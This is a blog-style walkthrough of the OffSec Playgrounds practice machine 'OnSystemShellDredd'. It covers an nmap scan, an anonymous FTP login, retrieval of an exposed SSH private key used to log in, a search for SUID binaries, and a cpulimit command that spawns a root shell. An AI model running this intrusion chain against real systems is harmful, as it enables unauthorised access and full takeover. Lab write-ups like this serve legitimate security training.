---
layout: post
title:  "OnSystemShellDredd Writeup"
date:   2022-07-16 12:35:41 +0530
---

# Walkthrough of OnSystemShellDredd

Hello everyone, in this post I'm sharing `offsec` play grounds `warm-up` machine called `OnSystemShellDredd`.  

## Nmap

First thing first that we have to find out opened ports of this target. So, I ran a full port scan against target ip here.

`nmap -sC -sV -p- <target-ip>`

```
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.49.116
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
61000/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 59:2d:21:0c:2f:af:9d:5a:7b:3e:a4:27:aa:37:89:08 (RSA)
|   256 59:26:da:44:3b:97:d2:30:b1:9b:9b:02:74:8b:87:58 (ECDSA)
|_  256 8e:ad:10:4f:e3:3e:65:28:40:cb:5b:bf:1d:24:7f:17 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.59 seconds

```

## Attack

We can see a interesting thing that **`Anonumous FTP login allowed`**. So, we can access to the ftp server by anonymous credentials.

```
username - anonymous
password - anonymous
```

Command will be `ftp <target-ip>`

we can list the files in ftp server with command `ls -la`. Fortunately there is a directory called `.hannah`. So, now we can change the directory by `cd .hannah` and again we can list files by the previous command we used.

```
Connected to 192.168.219.130.
220 (vsFTPd 3.0.3)
Name (192.168.219.130:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        115          4096 Aug 06  2020 .
drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..
drwxr-xr-x    2 0        0            4096 Aug 06  2020 .hannah
226 Directory send OK.
ftp> cd .hannah
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 06  2020 .
drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..
-rwxr-xr-x    1 0        0            1823 Aug 06  2020 id_rsa
226 Directory send OK.
```

We can see a file called `id_rsa` is there. So we can get that file by `get id_rsa`.

```
ftp> get id_rsa
local: id_rsa remote: id_rsa
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for id_rsa (1823 bytes).
226 Transfer complete.
1823 bytes received in 0.01 secs (207.4669 kB/s)
ftp> 
```

The default name for SSH keypair is id_rsa. So, you got that. We can connect to the target by ssh using this id_rsa.first of all you need to set private key permissions.

```
chmod 600 id_rsa
ssh hannah@<targetip> -i id_rsa -p 61000
```

```
The authenticity of host '[192.168.116.130]:61000 ([192.168.116.130]:61000)' can't be established.
ECDSA key fingerprint is SHA256:ceHZU8u3GwiQwVwrN4Ci830AmTvAmIUOlLjtVYcP2KM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.116.130]:61000' (ECDSA) to the list of known hosts.
Linux ShellDredd 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
hannah@ShellDredd:~$ ls
local.txt  user.txt
hannah@ShellDredd:~$ 
```

## Privilege Escalation

After login as user `hannah` we need to do a privilege escalation because we need to become root in this machine. In linux systems the `SUID` bit is a flag on a file which states that whoever runs the file will have the privileges of the owner of the file. Just imagine you are a normal `user` and the file is owned by `root`, then when you run that executable, the code runs with the permissions of the root user. The SUID bit only works on Linux ELF executables, meaning it does nothing if it???s set on a Bash shell script, a Python script file, a perl file or something like that.

You can find out the files with `SUID` enabled by this command.

``` 
command- find / -perm -u=s -type f 2>/dev/null 

find is a linux command which can find files in a directory.
-perm -u=s is searching for files with SUID.
2>/dev/null will filter out the errors so taht they will not be outputed to your console.

```

After I ran the command:-

```
hannah@ShellDredd:~$ find / -perm -u=s -type f 2>/dev/null

/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mawk
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/cpulimit
/usr/bin/mount
/usr/bin/passwd

```

Here you can see a interesting binary called `cpulimit`. That is out target.

## Time to be root

There is a interesting site called [gtfobins](https://gtfobins.github.io) that will help how to bypass this sort of misconfigured files.

command to be root

```
hannah@ShellDredd:~$ /usr/bin/cpulimit -l 100 -f -- /bin/sh -p
Process 1174 detected
# whoami
root
# cd /root
# ls
proof.txt  root.txt
```

Enjoy the flags Yourself!

## References

Don't be a script kiddy! Read more resources be a pro...

[Read more about SUID](https://materials.rangeforce.com/tutorial/2019/11/07/Linux-PrivEsc-SUID-Bit/)\
[Gtfobins](https://gtfobins.github.io/gtfobins/cpulimit/)
